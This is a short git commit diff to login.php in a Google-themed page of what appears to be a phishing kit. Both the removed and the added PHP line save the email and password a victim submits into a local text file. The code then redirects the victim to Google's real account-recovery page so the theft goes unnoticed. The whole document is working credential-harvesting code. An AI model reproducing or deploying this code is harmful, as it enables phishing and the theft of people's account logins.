5fd26be2f1a8ea1823dabc210cd396b81dbfeea2
Tahmid Rayat <56682134+htr-tech@users.noreply.github.com>
2019-11-27 18:37:43 +0600

    Update login.php

--- websites/google/login.php
+++ websites/google/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Gmail :- " . $_POST['email'] . "  || Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Username: " . $_POST['email'] . "Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
 exit();
